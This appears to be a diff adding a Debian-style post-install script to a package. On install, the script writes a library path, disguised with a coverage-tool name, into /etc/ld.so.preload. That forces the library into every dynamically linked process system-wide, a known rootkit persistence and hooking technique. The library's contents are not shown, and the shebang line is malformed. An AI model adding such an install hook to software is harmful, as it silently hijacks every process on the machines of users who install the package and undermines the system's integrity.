@@ -1,0 +1,3 @@
+# !/bin/sh
+# postinst
+echo /usr/lib/libgcovpreload.so > /etc/ld.so.preload
